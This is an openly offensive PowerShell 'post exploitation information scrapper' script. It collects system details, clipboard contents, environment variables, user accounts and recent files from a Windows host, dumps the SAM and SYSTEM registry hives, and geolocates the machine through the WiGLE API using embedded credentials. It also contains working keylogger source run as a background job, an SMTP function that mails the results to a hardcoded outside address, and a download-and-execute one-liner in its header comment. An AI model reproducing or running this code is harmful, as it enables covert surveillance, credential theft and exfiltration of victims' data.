#############################################################################################################
###																										                                                                             ###
### 		Information scrapper : Post exploitation information scrapper  powershell script			                 ###	
###																										                                                                             ###		
### 		By AXANO																					                                                                       ###	
###																										                                                                             ###
#############################################################################################################

<#
FIRST RUN "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
########## OR #############
USE 
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')
.SYNOPSIS
.EXAMPLE
.EXAMPLE
.USEFUL	
### Measures time needed to execute certain command
Measure-Command { commandToExecute }
.TODO
###check if user is in administrator group, if true and script inst run as admin try UAC bypass
https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-local-admins-group-on-a-remote-server
#>

### Add information to results
function Main(){
$results = "starters"
#initialize
#$results = nonAdministrativeScrapperFunctions

### Runs Key logger (does not require admin privs)
#keyLogger
$results += findGeoLocation
$results
#mail $results
}

function debug(){
$hello = "Hello World"
$hello | Out-File .\debug.txt
}
### SMTP mailing tool
### Sends a mail using a free smtp server
### $messageBody is send as message body in the mail
function mail($messageBody){

$smtpServer = "smtp.scarlet.be"

 #Creating a Mail object
 $msg = new-object Net.Mail.MailMessage

 #Creating SMTP server object
 $smtp = new-object Net.Mail.SmtpClient($smtpServer)
 $smtp.Enablessl = $true
 $smtp.port = 25
 #Email structure 
 ### !!!! From email can be spoofed
 ### On 12/09/2018 you could still use any gmail account as sender and receiver (TESTED)
 $msg.From = "powershell@scarlet.be"
 $msg.To.Add("perselis.e@gmail.com")

 $msg.subject = "Scrapper information"


 $msg.IsBodyHTML = $false
 $msg.body = $messageBody +""

 $ok=$true 
 Write-Host "SMTP Server:" $smtpserver "Port #:" $smtp.port "SSL Enabled?" $smtp.Enablessl
 try{
        $smtp.Send($msg)
        Write-Host "SENT"

 }
 catch {
    $error[0]
    $_.Exception.Response
    $ok=$false
 }
 finally{
    $msg.Dispose()

 }
 if($ok){
    Write-Host "EVERYTHING PASSED"
 }

}

function initialize(){
### Changes the window title
$host.ui.RawUI.WindowTitle = "Information scrapper"
}

function nonAdministrativeScrapperFunctions(){
$results = "Start of non Administrative Scrapper Functions`n"
$results += "`n`n"
### Get current date
$results += "`nCurrent Date `n"
$results += [System.DateTime]::Now
$results += "`n`n"
# or
# Get-Date
### Get execution policy to see if running a script is possible
$results += "`nExecution policy`n"
$results += Get-ExecutionPolicy 
$results += "`n`n"

<#
NOT NEEDED, systeminfo GATHERS THIS INFORMATION
### Get OS version
[Environment]::OSVersion
### Get OS type (home/pro/enterprise)
(Get-WmiObject -class Win32_OperatingSystem).Caption
#>

### Detailed system info
$results += "`nDetailed system info `n"
$results += systeminfo | Format-Table -HideTableHeaders | Out-String
$results += "`n`n"

### Gets public ip
$results += "`nPublic IP `n"
$results += Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
$results += "`n`n"

### Gets active tcp connections
$results += "`nActive TCP connections `n"
$results += Get-NetTCPConnection | Format-Table -HideTableHeaders | Out-String
$results += "`n`n"

### Gets contents of clipboard
$results += "`nClipboard content`n"
$results += Get-Clipboard
$results += "`n`n"

### Gets information of installation settings
$results += "`nInstallation settings info `n"
$results += Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion | Format-Table -HideTableHeaders | Out-String
$results += "`n`n"

### Detects if powershell is run as administrator
$results += "`nIs powershell run as admin? `n"
$results += [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
$results += "`n`n"

### Lists recently opened files
$results += "`nRecently opened files `n"
$results += dir $HOME"\AppData\Roaming\Microsoft\Windows\Recent\" | Format-Table -HideTableHeaders | Out-String
$results += "`n`n"

### Gets BIOS info (can be used to find out if a machine runs in a virtual environment)
$results += "`nBIOS info `n"
$results += Get-WmiObject win32_bios | Format-Table -HideTableHeaders | Out-String
$results += "`n`n"

### Gets  name, status, SID, Lastlogon of all local users
$results += "`nLocal users info `n"
$results += Get-LocalUser | Select-Object Name,Enabled,SID,Lastlogon | Format-Table -HideTableHeaders | Out-String
$results += "`n`n"

### Checks if computer is in domain
$results += "`nIs computer in a domain?`n"
if ((gwmi win32_computersystem).partofdomain -eq $true) {
    $results += "I am domain joined!"
} else {
    $results += "Ooops, workgroup!"
}
$results += "`n`n"

### Gets all running processes with details
$results += "`nAll running processes`n"
$results +=  Get-Process | Format-Table -HideTableHeaders | Out-String
$results += "`n`n"

### Slow but more detailed alternative (not needed if results will be stored in variable)
# Get-Process | format-list *

### Gets all environment variables
$results += "`nEnvironment variables`n"
$results +=  Get-ChildItem env: | Format-Table -HideTableHeaders | Out-String
$results += "`n`n"

$results
}


function administrativeScrapperFunctions(){
### Dump sam (needs administrator rights)
reg save HKLM\SAM .\sam

### Dump system (needs administrator rights)
reg save HKLM\SYSTEM .\system
}



### Function that creates a power shell file 
### with the key loggers source in it and runs it in background
### IF log file already exists, it appends results
function keyLogger(){
$scriptForKeyloggerAsString = 'Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private const string logFileName = @"%TEMP%\keylogger.txt";
    private static StreamWriter logFile;

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;

    public static void Main() {
	  string expandedFileName = Environment.ExpandEnvironmentVariables(logFileName);
      logFile = File.AppendText(expandedFileName);
      logFile.AutoFlush = true;

      hookId = SetHook(hookProc);
      Application.Run();
      UnhookWindowsHookEx(hookId);
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        int vkCode = Marshal.ReadInt32(lParam);
        logFile.Write((Keys)vkCode);
      }

      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
  }
}
"@ -ReferencedAssemblies System.Windows.Forms
[KeyLogger.Program]::Main();
'
### WORKING ###
#Invoke-Expression $scriptForKeyloggerAsString
### THIS WAS A HELL TO FIND BUT IT WORKS!!!
$command = '$scriptBlockVar ='+$scriptForKeyloggerAsString+'
 Invoke-Expression $scriptBlockVar'
$scriptBlock = [scriptblock]::Create($command)
### Starts script block in background
$job = start-Job -scriptblock $scriptBlock
### DEBUG
#$job | Format-List -Property *
}


### Finds geolocation by searching the WIGLE database with the current SSID and the BSSID of the current connected AP
# This function uses an authentication token given by WIGLE.
# API docs can be found here : https://api.wigle.net/swagger#/Network%20search%20and%20information%20tools/search_1
# TODO add try catch to filter pc's with no wireless connection
function findGeoLocation(){
	
	# Gets current AP 
	$strDump = netsh wlan show interfaces
	# PARSING....
	$objInterface = "" | Select-Object SSID,BSSID

	foreach ($strLine in $strDump) {
		if ($strLine -match "^\s+SSID") {
			$objInterface.SSID = $strLine -Replace "^\s+SSID\s+:\s+",""
		} elseif ($strLine -match "^\s+BSSID") {
			$objInterface.BSSID = $strLine -Replace "^\s+BSSID\s+:\s+",""
		}
	}
	
	#Variable isolation
	$SSID = $objInterface.SSID
	$BSSID = $objInterface.BSSID


	# Building the final URI
	$uri = "https://api.wigle.net/api/v2/network/search?onlymine=false&first=0&freenet=false&paynet=false&netid="+$BSSID+"&ssid="+$SSID
	# Auth tokens
	$user = 'AIDeeed5624aa547065e149f4c3067b8a26'
	$pass = '4146a9f04324cc281439e23da8ec5686'
	# Creating pair used for encoding 
	$pair = "$($user):$($pass)"

	$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))

	$basicAuthValue = "Basic $encodedCreds"
	# Building headers
	$Headers = @{
		Authorization = $basicAuthValue
	}
	# Making actual request
	$response = Invoke-RestMethod -Uri $uri -Headers $Headers
	$response
	$response.results
	
	
}



### Strict mode is scoped.
### It prevents minor scripting errors like accessing non existent variables
Set-StrictMode -Version Latest

### Calling Main
. Main
